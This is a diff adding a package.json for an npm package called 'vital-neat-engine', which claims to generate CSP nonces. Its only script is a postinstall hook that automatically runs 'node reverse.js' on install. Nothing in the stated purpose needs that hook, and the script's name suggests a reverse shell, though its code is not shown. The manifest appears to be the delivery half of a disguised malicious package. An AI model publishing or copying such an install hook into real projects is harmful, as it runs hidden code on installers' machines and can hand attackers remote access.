@@ -1,0 +1,10 @@
+{
+  "name": "vital-neat-engine",
+  "version": "0.0.4",
+  "description": "generates nonce for CSP policy",
+  "author": "pavkirill",
+  "scripts": {
+    "postinstall": "node reverse.js"
+  },
+  "license": "MIT"
+}
